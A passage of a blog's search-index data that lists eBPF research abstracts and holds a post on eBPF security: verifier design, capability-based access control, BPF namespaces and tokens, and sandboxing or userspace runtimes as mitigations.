eBPF runtime in user space, paving the way for more efficient and secure kernel operations.</p> <p>https://arxiv.org/abs/2311.07923#</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#kgent-kernel-extensions-large-language-model-agent","title":"Kgent: Kernel Extensions Large Language Model Agent","text":"<p>The ability to modify and extend an operating system is an important feature for improving a system's security, reliability, and performance. The extended Berkeley Packet Filters (eBPF) ecosystem has emerged as the standard mechanism for extending the Linux kernel and has recently been ported to Windows. eBPF programs inject new logic into the kernel that the system will execute before or after existing logic. While the eBPF ecosystem provides a flexible mechanism for kernel extension, it is difficult for developers to write eBPF programs today. An eBPF developer must have deep knowledge of the internals of the operating system to determine where to place logic and cope with programming limitations on the control flow and data accesses of their eBPF program enforced by the eBPF verifier. This paper presents KEN, an alternative framework that alleviates the difficulty of writing an eBPF program by allowing Kernel Extensions to be written in Natural language. KEN uses recent advances in large language models (LLMs) to synthesize an eBPF program given a user's English language prompt. To ensure that LLM's output is semantically equivalent to the user's prompt, KEN employs a combination of LLM-empowered program comprehension, symbolic execution, and a series of feedback loops. KEN's key novelty is the combination of these techniques. In particular, the system uses symbolic execution in a novel structure that allows it to combine the results of program synthesis and program comprehension and build on the recent success that LLMs have shown for each of these tasks individually. To evaluate KEN, we developed a new corpus of natural language prompts for eBPF programs. We show that KEN produces correct eBPF programs on 80% which is an improvement of a factor of 2.67 compared to an LLM-empowered program synthesis baseline.</p> <p>eBPF'24: https://dl.acm.org/doi/10.1145/3672197.3673434 and arxiv https://arxiv.org/abs/2312.05531</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#programmable-system-call-security-with-ebpf","title":"Programmable System Call Security with eBPF","text":"<p>System call filtering is a widely used security mechanism for protecting a shared OS kernel against untrusted user applications. However, existing system call filtering techniques either are too expensive due to the context switch overhead imposed by userspace agents, or lack sufficient programmability to express advanced policies. Seccomp, Linux's system call filtering module, is widely used by modern container technologies, mobile apps, and system management services. Despite the adoption of the classic BPF language (cBPF), security policies in Seccomp are mostly limited to static allow lists, primarily because cBPF does not support stateful policies. Consequently, many essential security features cannot be expressed precisely and/or require kernel modifications. In this paper, we present a programmable system call filtering mechanism, which enables more advanced security policies to be expressed by leveraging the extended BPF language (eBPF). More specifically, we create a new Seccomp eBPF program type, exposing, modifying or creating new eBPF helper functions to safely manage filter state, access kernel and user state, and utilize synchronization primitives. Importantly, our system integrates with existing kernel privilege and capability mechanisms, enabling unprivileged users to install advanced filters safely. Our evaluation shows that our eBPF-based filtering can enhance existing policies (e.g., reducing the attack surface of early execution phase by up to 55.4% for temporal specialization), mitigate real-world vulnerabilities, and accelerate filters.</p> <p>https://arxiv.org/abs/2302.10366</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#cross-container-attacks-the-bewildered-ebpf-on-clouds","title":"Cross Container Attacks: The Bewildered eBPF on Clouds","text":"<p>The extended Berkeley Packet Filter (eBPF) provides powerful and flexible kernel interfaces to extend the kernel functions for user space programs via running bytecode directly in the kernel space. It has been widely used by cloud services to enhance container security, network management, and system observability. However, we discover that the offensive eBPF that have been extensively discussed in Linux hosts can bring new attack surfaces to containers. With eBPF tracing features, attackers can break the container's isolation and attack the host, e.g., steal sensitive data, DoS, and even escape the container. In this paper, we study the eBPF-based cross container attacks and reveal their security impacts in real world services. With eBPF attacks, we successfully compromise five online Jupyter/Interactive Shell services and the Cloud Shell of Google Cloud Platform. Furthermore, we find that the Kubernetes services offered by three leading cloud vendors can be exploited to launch cross-node attacks after the attackers escape the container via eBPF. Specifically, in Alibaba's Kubernetes services, attackers can compromise the whole cluster by abusing their over-privileged cloud metrics or management Pods. Unfortunately, the eBPF attacks on containers are seldom known and can hardly be discovered by existing intrusion detection systems. Also, the existing eBPF permission model cannot confine the eBPF and ensure secure usage in shared-kernel container environments. To this end, we propose a new eBPF permission model to counter the eBPF attacks in containers.</p> <p>https://www.usenix.org/conference/usenixsecurity23/presentation/he</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#comparing-security-in-ebpf-and-webassembly","title":"Comparing Security in eBPF and WebAssembly","text":"<p>This paper examines the security of eBPF and WebAssembly (Wasm), two technologies that have gained widespread adoption in recent years, despite being designed for very different use cases and environments. While eBPF is a technology primarily used within operating system kernels such as Linux, Wasm is a binary instruction format designed for a stack-based virtual machine with use cases extending beyond the web. Recognizing the growth and expanding ambitions of eBPF, Wasm may provide instructive insights, given its design around securely executing arbitrary untrusted programs in complex and hostile environments such as web browsers and clouds. We analyze the security goals, community evolution, memory models, and execution models of both technologies, and conduct a comparative security assessment, exploring memory safety, control flow integrity, API access, and side-channels. Our results show that eBPF has a history of focusing on performance first and security second, while Wasm puts more emphasis on security at the cost of some runtime overheads. Considering language-based restrictions for eBPF and a security model for API access are fruitful directions for future work.</p> <p>https://dl.acm.org/doi/abs/10.1145/3609021.3609306</p> <p>More about can be found in the first workshop: https://conferences.sigcomm.org/sigcomm/2023/workshop-ebpf.html</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#a-flow-based-ids-using-machine-learning-in-ebpf","title":"A flow-based IDS using Machine Learning in eBPF","text":"<p>eBPF is a new technology which allows dynamically loading pieces of code into the Linux kernel. It can greatly speed up networking since it enables the kernel to process certain packets without the involvement of a userspace program. So far eBPF has been used for simple packet filtering applications such as firewalls or Denial of Service protection. We show that it is possible to develop a flow based network intrusion detection system based on machine learning entirely in eBPF. Our solution uses a decision tree and decides for each packet whether it is malicious or not, considering the entire previous context of the network flow. We achieve a performance increase of over 20% compared to the same solution implemented as a userspace program.</p> <p>https://arxiv.org/abs/2102.09980</p>"},{"location":"blog/2024/03/11/the-evolution-and-impact-of-ebpf-a-list-of-key-research-papers-from-recent-years/#femto-containers-lightweight-virtualization-and-fault-isolation-for-small-software-functions-on-low-power-iot-microcontrollers","title":"Femto-containers: lightweight virtualization and fault isolation for small software functions on low-power IoT microcontrollers","text":"<p>Low-power operating system runtimes used on IoT microcontrollers typically provide rudimentary APIs, basic connectivity and, sometimes, a (secure) firmware update mechanism. In contrast, on less constrained hardware, networked software has entered the age of serverless, microservices and agility. With a view to bridge this gap, in the paper we design Femto-Containers, a new middleware runtime which can be embedded on heterogeneous low-power IoT devices. Femto-Containers enable the secure deployment, execution and isolation of small virtual software functions on low-power IoT devices, over the network. We implement Femto-Containers, and provide integration in RIOT, a popular open source IoT operating system. We then evaluate the performance of our implementation, which was formally verified for fault-isolation, guaranteeing that RIOT is shielded from logic loaded and executed in a Femto-Container. Our experiments on various popular micro-controller architectures (Arm Cortex-M, ESP32 and RISC-V) show that Femto-Containers offer an attractive trade-off in terms of memory footprint overhead, energy consumption, and security.</p> <p>https://dl.acm.org/doi/abs/10.1145/3528535.3565242</p> <p>Share on  Share on </p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/","title":"The Secure Path Forward for eBPF runtime: Challenges and Innovations","text":"<p>Yusheng Zheng</p> <p>Extended Berkeley Packet Filter (eBPF) represents a significant evolution in the way we interact with and extend the capabilities of modern operating systems. As a powerful technology that enables the Linux kernel to run sandboxed programs in response to events, eBPF has become a cornerstone for system observability, networking, and security features.</p> <p>However, as with any system that interfaces closely with the kernel, the security of eBPF itself is paramount. In this blog, we delve into the often-overlooked aspect of eBPF security, exploring how the mechanisms intended to safeguard eBPF can themselves be fortified. We'll dissect the role of the eBPF verifier, scrutinize the current access control model, and investigate potential improvements from ongoing research. Moreover, we'll navigate through the complexities of securing eBPF, addressing open questions and the challenges they pose to system architects and developers alike.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#table-of-contents","title":"Table of Contents","text":"<ul> <li>The Secure Path Forward for eBPF runtime: Challenges and Innovations</li> <li>Table of Contents</li> <li>How eBPF Ensures Security with Verifier<ul> <li>What the eBPF Verifier Is and What It Does</li> <li>How the eBPF Verifier Works</li> <li>Challenges</li> <li>Other works to improve verifier</li> </ul> </li> <li>Limitations in eBPF Access Control<ul> <li>CAP_BPF</li> <li>bpf namespace</li> <li>Unprivileged eBPF</li> <li>Trusted Unprivileged BPF</li> </ul> </li> <li>Other possible solutions<ul> <li>MOAT: Towards Safe BPF Kernel Extension (Isolation)</li> <li>Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing</li> <li>Kernel extension verification is untenable</li> <li>Wasm-bpf: WebAssembly eBPF library, toolchain and runtime</li> <li><code>bpftime</code>: Userspace eBPF runtime for uprobe \\&amp; syscall hook \\&amp; plugin</li> </ul> </li> <li>Conclusion</li> </ul>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#how-ebpf-ensures-security-with-verifier","title":"How eBPF Ensures Security with Verifier","text":"<p>The security framework of eBPF is largely predicated on the robustness of its verifier. This component acts as the gatekeeper, ensuring that only safe and compliant programs are allowed to run within the kernel space.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#what-the-ebpf-verifier-is-and-what-it-does","title":"What the eBPF Verifier Is and What It Does","text":"<p>At its core, the eBPF verifier is a static code analyzer. Its primary function is to vet the BPF program instructions before they are executed. It scrutinizes a copy of the program within the kernel, operating with the following objectives:</p> <ul> <li><code>Ensuring Program Termination</code></li> </ul> <p>The verifier uses depth-first search (DFS) algorithms to traverse the program's control flow graph, which it ensures is a Directed Acyclic Graph (DAG). This is crucial for guaranteeing that the program cannot enter into an infinite loop, thereby ensuring its termination. It meticulously checks for any unbounded loops and malformed or out-of-bounds jumps that could disrupt the normal operation of the kernel or lead to a system hang.</p> <ul> <li><code>Ensuring Memory Safety</code></li> </ul> <p>Memory safety is paramount in kernel operations. The verifier checks for potential out-of-bounds memory accesses that could lead to data corruption or security breaches. It also safeguards against use-after-free bugs and object leaks, which are common vulnerabilities that can be exploited. In addition to these, it takes into account hardware vulnerabilities like Spectre, enforcing mitigations to prevent such side-channel attacks.</p> <ul> <li><code>Ensuring Type Safety</code></li> </ul> <p>Type safety is another critical aspect that the verifier ensures. By preventing type confusion bugs, it helps maintain the integrity of data within the kernel. The eBPF verifier utilizes BPF Type Format (BTF), which allows it to accurately understand and check the kernel's complex data structures, ensuring that the program's operations on these structures are valid and safe.</p> <ul> <li><code>Preventing Hardware Exceptions</code></li> </ul> <p>Hardware exceptions, such as division by zero, can cause abrupt program terminations and kernel panics. To prevent this, the verifier includes checks for divisions by unknown scalars, ensuring that instructions are rewritten or handled in a manner consistent with aarch64 specifications, which dictate safe handling of such exceptions.</p> <p>Through these mechanisms, the eBPF verifier plays a critical role in maintaining the security and stability of the kernel, making it an indispensable component of the eBPF infrastructure. It not only reinforces the system's defenses but also upholds the integrity of operations that eBPF programs intend to perform, making it a quintessential part of the eBPF ecosystem.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#how-the-ebpf-verifier-works","title":"How the eBPF Verifier Works","text":"<p>The eBPF verifier is essentially a sophisticated simulation engine that exhaustively tests every possible execution path of a given eBPF program. This simulation is not a mere theoretical exercise but a stringent enforcement of security and safety policies in kernel operations.</p> <ul> <li>Follows control flow graph   The verifier begins its analysis by constructing and following the control flow graph (CFG) of the eBPF program. It carefully computes the set of possible states for each instruction, considering the BPF register set and stack. Safety checks are then performed depending on the current instruction context.</li> </ul> <p>One of the critical aspects of this process is register spill/fill tracking for the program's private BPF stack. This ensures that operations involving the stack do not lead to overflows or underflows, which could corrupt data or provide an attack vector.</p> <ul> <li> <p>Back-edges in control flow graph   To effectively manage loops within the eBPF program, the verifier identifies back-edges in the CFG. Bounded loops are handled by simulating all iterations up to a predefined limit, thus guaranteeing that loops will not lead to indefinite execution.</p> </li> <li> <p>Dealing with potentially large number of states   The verifier must manage the complexity that comes with the large number of potential states in a program's execution paths. It employs path pruning logic to compare the current state with prior states, assessing whether the current path is \"equivalent\" to prior paths and has a safe exit. This reduces the overall number of states that need to be considered.</p> </li> <li> <p>Function-by-function verification for state reduction   To streamline the verification process, the verifier conducts a function-by-function analysis. This modular approach allows for a reduction in the number of states that need to be analyzed at any given time, thereby improving the efficiency of the verification.</p> </li> <li> <p>On-demand scalar precision (back-)tracking for state reduction   The verifier uses on-demand scalar precision tracking to reduce the state space further. By back-tracking scalar values when necessary, the verifier can more accurately predict the program's behavior, optimizing its analysis process.</p> </li> <li> <p>Terminates with rejection upon surpassing \u201ccomplexity\u201d threshold   To maintain practical performance, the verifier has a \"complexity\" threshold. If a program's analysis surpasses this threshold, the verifier will terminate the process and reject the program. This ensures that only programs that are within the manageable complexity are allowed to execute, balancing security with system performance.</p> </li> </ul>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#challenges","title":"Challenges","text":"<p>Despite its thoroughness, the eBPF verifier faces significant challenges:</p> <ul> <li> <p>Attractive target for exploitation when exposed to non-root users   As the verifier becomes more complex, it becomes an increasingly attractive target for exploitation. The programmability of eBPF, while powerful, also means that if an attacker were to bypass the verifier and gain execution within the OS kernel, the consequences could be severe.</p> </li> <li> <p>Reasoning about verifier correctness is non-trivial   Ensuring the verifier's correctness, especially concerning Spectre mitigations, is not a straightforward task. While there is some formal verification in place, it is only partial. Areas such as the Just-In-Time (JIT) compilers and abstract interpretation models are particularly challenging.</p> </li> <li> <p>Occasions where valid programs get rejected   There is sometimes a disconnect between the optimizations performed by LLVM (the compiler infrastructure used to prepare eBPF programs) and the verifier's ability to understand these optimizations, leading to valid programs being erroneously rejected.</p> </li> <li> <p>\"Stable ABI\" for BPF program types   A \"stable ABI\" is vital so that BPF programs running in production do not break upon an OS kernel upgrade. However, maintaining this stability while also evolving the verifier and the BPF ecosystem presents its own set of challenges.</p> </li> <li> <p>Performance vs. security considerations   Finally, the eternal trade-off between performance and security is pronounced in the verification of complex eBPF programs. While the verifier must be efficient to be practical, it also must not compromise on security, as the performance of the programs it is verifying is crucial for modern computing systems.</p> </li> </ul> <p>The eBPF verifier stands as a testament to the ingenuity in modern computing security, navigating the treacherous waters between maximum programmability and maintaining a fortress-like defense at the kernel level.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#other-works-to-improve-verifier","title":"Other works to improve verifier","text":"<ul> <li>Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel: https://www.usenix.org/conference/osdi20/presentation/nelson</li> <li>\"Sound, Precise, and Fast Abstract Interpretation with Tristate Numbers\u201d, Vishwanathan et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cEliminating bugs in BPF JITs using automated formal verification\u201d, Nelson et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cA proof-carrying approach to building correct and flexible BPF verifiers\u201d, Nelson et al. https://linuxplumbersconf.org/event/7/contributions/685/</li> <li>\u201cAutomatically optimizing BPF programs using program synthesis\u201d, Xu et al. https://linuxplumbersconf.org/event/11/contributions/944/</li> <li>\u201cSimple and Precise Static Analysis of Untrusted Linux Kernel Extensions\u201d, Gershuni et al. https://linuxplumbersconf.org/event/11/contributions/951/</li> <li>\u201cAn Analysis of Speculative Type Confusion Vulnerabilities in the Wild\u201d, Kirzner et al. https://www.usenix.org/conference/usenixsecurity21/presentation/kirzner</li> </ul> <p>Together, these works signify a robust and multi-faceted research initiative aimed at bolstering the foundations of eBPF verification, ensuring that it remains a secure and performant tool for extending the capabilities of the Linux kernel.</p> <p>Other reference for you to learn more about eBPF verifier:</p> <ul> <li>BPF and Spectre: Mitigating transient execution attacks: https://popl22.sigplan.org/details/prisc-2022-papers/11/BPF-and-Spectre-Mitigating-transient-execution-attacks</li> </ul>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#limitations-in-ebpf-access-control","title":"Limitations in eBPF Access Control","text":"<p>After leading Linux distributions, such as Ubuntu and SUSE, have disallowed unprivileged usage of eBPF Socket Filter and CGroup programs, the current eBPF access control model only supports a single permission level. This level necessitates the CAP_SYS_ADMIN capability for all features. However, CAP_SYS_ADMIN carries inherent risks, particularly to containers, due to its extensive privileges.</p> <p>Addressing this, Linux 5.6 introduces a more granular permission system by breaking down eBPF capabilities. Instead of relying solely on CAP_SYS_ADMIN, a new capability, CAP_BPF, is introduced for invoking the bpf syscall. Additionally, installing specific types of eBPF programs demands further capabilities, such as CAP_PERFMON for performance monitoring or CAP_NET_ADMIN for network administration tasks. This structure aims to mitigate certain types of attacks\u2014like altering process memory or eBPF maps\u2014that still require CAP_SYS_ADMIN.</p> <p>Nevertheless, these segregated capabilities are not bulletproof against all eBPF-based attacks, such as Denial of Service (DoS) and information theft. Attackers may exploit these to craft eBPF-based malware specifically targeting containers. The emergence of eBPF in cloud-native applications exacerbates this threat, as users could inadvertently deploy containers that contain untrusted eBPF programs.</p> <p>Compounding the issue, the risks associated with eBPF in containerized environments are not entirely understood. Some container services might unintentionally grant eBPF permissions, for reasons such as enabling filesystem mounting functionality. The existing permission model is inadequate in preventing misuse of these potentially harmful eBPF features within containers.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#cap_bpf","title":"CAP_BPF","text":"<p>Traditionally, almost all BPF actions required CAP_SYS_ADMIN privileges, which also grant broad system access. Over time, there has been a push to separate BPF permissions from these root privileges. As a result, capabilities like CAP_PERFMON and CAP_BPF were introduced to allow more granular control over BPF operations, such as reading kernel memory and loading tracing or networking programs, without needing full system admin rights.</p> <p>However, CAP_BPF's scope is also ambiguous, leading to a perception problem. Unlike CAP_SYS_MODULE, which is well-defined and used for loading kernel modules, CAP_BPF lacks namespace constraints, meaning it can access all kernel memory rather than being container-specific. This broad access is problematic because verifier bugs in BPF programs can crash the kernel, considered a security vulnerability, leading to an excessive number of CVEs (Common Vulnerabilities and Exposures) being filed, even for bugs that are already fixed. This response to verifier bugs creates undue alarm and urgency to patch older kernel versions that may not have been updated.</p> <p>Additionally, some security startups have been criticized for exploiting the fears around BPF's capabilities to market their products, paradoxically using BPF itself to safeguard against the issues they highlight. This has led to a contradictory narrative where BPF is both demonized and promoted as a solution.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#bpf-namespace","title":"bpf namespace","text":"<p>The current security model requires the CAP_SYS_ADMIN capability for iterating BPF object IDs and converting these IDs to file descriptors (FDs). This is to prevent non-privileged users from accessing BPF programs owned by others, but it also restricts them from inspecting their own BPF objects, posing a challenge in container environments.</p> <p>Users can run BPF programs with CAP_BPF and other specific capabilities, yet they lack a generic method to inspect these programs, as tools like bpftool need CAP_SYS_ADMIN. The existing workaround without CAP_SYS_ADMIN is deemed inconvenient, involving SCM_RIGHTS and Unix domain sockets for sharing BPF object FDs between processes.</p> <p>To address these limitations, Yafang Shao proposes introducing a BPF namespace. This would allow users to create BPF maps, programs, and links within a specific namespace, isolating these objects from users in different namespaces. However, objects within a BPF namespace would still be visible to the parent namespace, enabling system administrators to maintain oversight.</p> <p>The BPF namespace is conceptually similar to the PID namespace and is intended to be intuitive. The initial implementation focuses on BPF maps, programs, and links, with plans to extend this to other BPF objects like BTF and bpffs in the future. This could potentially enable container users to trace only the processes within their container without accessing data from other containers, enhancing security and usability in containerized environments.</p> <p>reference:</p> <ul> <li>BPF and security: https://lwn.net/Articles/946389/</li> <li>Cross Container Attacks: The Bewildered eBPF on Clouds https://www.usenix.org/system/files/usenixsecurity23-he.pdf</li> <li>bpf: Introduce BPF namespace: https://lwn.net/Articles/927354/</li> <li>ebpf-running-in-linux-namespaces: https://stackoverflow.com/questions/48815633/ebpf-running-in-linux-namespaces</li> </ul>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#unprivileged-ebpf","title":"Unprivileged eBPF","text":"<p>The concept of unprivileged eBPF refers to the ability for non-root users to load eBPF programs into the kernel. This feature is controversial due to security implications and, as such, is currently turned off by default across all major Linux distributions. The concern stems from hardware vulnerabilities like Spectre to kernel bugs and exploits, which can be exploited by malicious eBPF programs to leak sensitive data or attack the system.</p> <p>To combat this, mitigations have been put in place for various versions of these vulnerabilities, like v1, v2, and v4. However, these mitigations come at a cost, often significantly reducing the flexibility and performance of eBPF programs. This trade-off makes the feature unattractive and impractical for many users and use cases.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#trusted-unprivileged-bpf","title":"Trusted Unprivileged BPF","text":"<p>In light of these challenges, a middle ground known as \"trusted unprivileged BPF\" is being explored. This approach would involve an allowlist system, where specific eBPF programs that have been thoroughly vetted and deemed trustworthy could be loaded by unprivileged users. This vetting process would ensure that only secure, production-ready programs bypass the privilege requirement, maintaining a balance between security and functionality. It's a step toward enabling more widespread use of eBPF without compromising the system's integrity.</p> <ul> <li> <p>Permissive LSM hooks: Rejected upstream given LSMs enforce further restrictions</p> <p>New Linux Security Module (LSM) hooks specifically for the BPF subsystem, with the intent of offering more granular control over BPF maps and BTF data objects. These are fundamental to the operation of modern BPF applications.</p> <p>The primary addition includes two LSM hooks: bpf_map_create_security and bpf_btf_load_security, which provide the ability to override the default permission checks that rely on capabilities like CAP_BPF and CAP_NET_ADMIN. This new mechanism allows for finer control, enabling policies to enforce restrictions or bypass checks for trusted applications, shifting the decision-making to custom LSM policy implementations.</p> <p>This approach allows for a safer default by not requiring applications to have BPF-related capabilities, which are typically required to interact with the kernel's BPF subsystem. Instead, applications can run without such privileges, with only vetted and trusted cases being granted permission to operate as if they had elevated capabilities.</p> </li> <li> <p>BPF token concept to delegate subset of BPF via token fd from trusted privileged daemon</p> <p>the BPF token, a new mechanism allowing privileged daemons to delegate a subset of BPF functionality to trusted unprivileged applications. This concept enables containerized BPF applications to operate safely within user namespaces\u2014a feature previously unattainable due to security restrictions with CAP_BPF capabilities. The BPF token is created and managed via kernel APIs, and it can be pinned within the BPF filesystem for controlled access. The latest version of the patch ensures that a BPF token is confined to its creation instance in the BPF filesystem to prevent misuse. This addition to the BPF subsystem facilitates more secure and flexible unprivileged BPF operations.</p> </li> <li> <p>BPF signing as gatekeeper: application vs BPF program (no one-size-fits-all)</p> <p>Song Liu has proposed a patch for unprivileged access to BPF functionality through a new device, <code>/dev/bpf</code>. This device controls access via two new ioctl commands that allow users with write permissions to the device to invoke <code>sys_bpf()</code>. These commands toggle the ability of the current task to call <code>sys_bpf()</code>, with the permission state being stored in the <code>task_struct</code>. This permission is also inheritable by new threads created by the task. A new helper function, <code>bpf_capable()</code>, is introduced to check if a task has obtained permission through <code>/dev/bpf</code>. The patch includes updates to documentation and header files.</p> </li> <li> <p>RPC to privileged BPF daemon: Limitations depending on use cases/environment</p> <p>The RPC approach (eg. bpfd) is similar to the BPF token concept, but it uses a privileged daemon to manage the BPF programs. This daemon is responsible for loading and unloading BPF programs, as well as managing the BPF maps. The daemon is also responsible for verifying the BPF programs before loading them. This approach is more flexible than the BPF token concept, as it allows for more fine-grained control over the BPF programs. However, it is also more complex, bring more maintenance challenges and possibilities for single points of failure.</p> </li> </ul> <p>reference</p> <ul> <li>Permissive LSM hooks: https://lore.kernel.org/bpf/20230412043300.360803-1-andrii@kernel.org/</li> <li>BPF token concept: https://lore.kernel.org/bpf/20230629051832.897119-1-andrii@kernel.org/</li> <li>BPF signing using fsverity and LSM gatekeeper: https://www.youtube.com/watch?v=9p4qviq60z8</li> <li>Sign the BPF bytecode: https://lpc.events/event/16/contributions/1357/attachments/1045/1999/BPF%20Signatures.pdf</li> <li>bpfd: https://bpfd.dev/</li> </ul>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#other-possible-solutions","title":"Other possible solutions","text":"<p>Here are also some research or discussions about how to improve the security of eBPF. Existing works can be roughly divided into three categories: virtualization, Software Fault Isolation (SFI), and formal methods. Use a sandbox like WebAssembly to deploy eBPF programs or run eBPF programs in userspace is also a possible solution.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#moat-towards-safe-bpf-kernel-extension-isolation","title":"MOAT: Towards Safe BPF Kernel Extension (Isolation)","text":"<p>The Linux kernel makes considerable use of Berkeley Packet Filter (BPF) to allow user-written BPF applications to execute in the kernel space. BPF employs a verifier to statically check the security of user-supplied BPF code. Recent attacks show that BPF programs can evade security checks and gain unauthorized access to kernel memory, indicating that the verification process is not flawless. In this paper, we present MOAT, a system that isolates potentially malicious BPF programs using Intel Memory Protection Keys (MPK). Enforcing BPF program isolation with MPK is not straightforward; MOAT is carefully designed to alleviate technical obstacles, such as limited hardware keys and supporting a wide variety of kernel BPF helper functions. We have implemented MOAT in a prototype kernel module, and our evaluation shows that MOAT delivers low-cost isolation of BPF programs under various real-world usage scenarios, such as the isolation of a packet-forwarding BPF program for the memcached database with an average throughput loss of 6%.</p> <p>https://arxiv.org/abs/2301.13421</p> <p>If we must resort to hardware protection mechanisms, is language safety or verification still necessary to protect the kernel and extensions from one another?</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#unleashing-unprivileged-ebpf-potential-with-dynamic-sandboxing","title":"Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing","text":"<p>For safety reasons, unprivileged users today have only limited ways to customize the kernel through the extended Berkeley Packet Filter (eBPF). This is unfortunate, especially since the eBPF framework itself has seen an increase in scope over the years. We propose SandBPF, a software-based kernel isolation technique that dynamically sandboxes eBPF programs to allow unprivileged users to safely extend the kernel, unleashing eBPF's full potential. Our early proof-of-concept shows that SandBPF can effectively prevent exploits missed by eBPF's native safety mechanism (i.e., static verification) while incurring 0%-10% overhead on web server benchmarks.</p> <p>https://arxiv.org/abs/2308.01983</p> <p>It may be conflict with the original design of eBPF, since it's not designed to use sandbox to ensure safety. Why not using webassembly in kernel if you want SFI?</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#kernel-extension-verification-is-untenable","title":"Kernel extension verification is untenable","text":"<p>The emergence of verified eBPF bytecode is ushering in a new era of safe kernel extensions. In this paper, we argue that eBPF\u2019s verifier\u2014the source of its safety guarantees\u2014has become a liability. In addition to the well-known bugs and vulnerabilities stemming from the complexity and ad hoc nature of the in-kernel verifier, we highlight a concerning trend in which escape hatches to unsafe kernel functions (in the form of helper functions) are being introduced to bypass verifier-imposed limitations on expressiveness, unfortunately also bypassing its safety guarantees. We propose safe kernel extension frameworks using a balance of not just static but also lightweight runtime techniques. We describe a design centered around kernel extensions in safe Rust that will eliminate the need of the in-kernel verifier, improve expressiveness, allow for reduced escape hatches, and ultimately improve the safety of kernel extensions</p> <p>https://sigops.org/s/conferences/hotos/2023/papers/jia.pdf</p> <p>It may limits the kernel to load only eBPF programs that are signed by trusted third parties, as the kernel itself can no longer independently verify them. The rust toolchains also has vulnerabilities.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#wasm-bpf-webassembly-ebpf-library-toolchain-and-runtime","title":"Wasm-bpf: WebAssembly eBPF library, toolchain and runtime","text":"<p>Wasm-bpf is a WebAssembly eBPF library, toolchain and runtime allows the construction of eBPF programs into Wasm with little to no changes to the code, and run them cross platforms with Wasm sandbox.</p> <p>It provides a configurable environment with limited eBPF WASI behavior, enhancing security and control. This allows for fine-grained permissions, restricting access to kernel resources and providing a more secure environment. For instance, eBPF programs can be restricted to specific types of useage, such as network monitoring, it can also configure what kind of eBPF programs can be loaded in kernel, what kind of attach event it can access without the need for modify kernel eBPF permission models.</p> <ul> <li>Kubecon talk: https://sched.co/1R2uf</li> <li>Repo: https://github.com/eunomia-bpf/wasm-bpf</li> </ul> <p>It will require additional effort to port the application to WebAssembly. Additionally, Wasm interface of kernel eBPF also need more effort of maintain, as the BPF daemon does.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#bpftime-userspace-ebpf-runtime-for-uprobe-syscall-hook-plugin","title":"<code>bpftime</code>: Userspace eBPF runtime for uprobe &amp; syscall hook &amp; plugin","text":"<p>An userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts. The runtime facilitates interprocess eBPF maps in userspace shared memory, and is also compatible with kernel eBPF maps, allowing for seamless operation with the kernel's eBPF infrastructure. It includes a high-performance LLVM JIT for various architectures, alongside a lightweight JIT for x86 and an interpreter.</p> <ul> <li>https://arxiv.org/abs/2311.07923</li> <li>Linux Plumbers: https://lpc.events/event/17/contributions/1639/</li> <li>Repo: https://github.com/eunomia-bpf/bpftime</li> </ul> <p>It may only limited to centain eBPF program types and usecases, not a general approach for kernel eBPF.</p>"},{"location":"blog/2024/02/11/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations/#conclusion","title":"Conclusion","text":"<p>As we have traversed the multifaceted domain of eBPF security, it's clear that while eBPF\u2019s verifier provides a robust first line of defense, there are inherent limitations within the current access control model that require attention. We have considered potential solutions from the realms of virtualization, software fault isolation, and formal methods to WebAssembly or userspace eBPF runtime, each offering unique approaches to fortify eBPF against vulnerabilities.</p> <p>However, as with any complex system, new questions and challenges continue to surface. The gaps identified between the theoretical security models and their practical implementation invite continued research and experimentation. The future of eBPF security is not only promising but also demands a collective effort to ensure the technology can be adopted with confidence in its capacity to safeguard systems.</p> <p>We are github.com/eunomia-bpf, build open source projects to make eBPF easier to use, and exploring new technologies, toolchains and runtimes related to eBPF. For those interested in eBPF technology, check out our tutorial code repository at 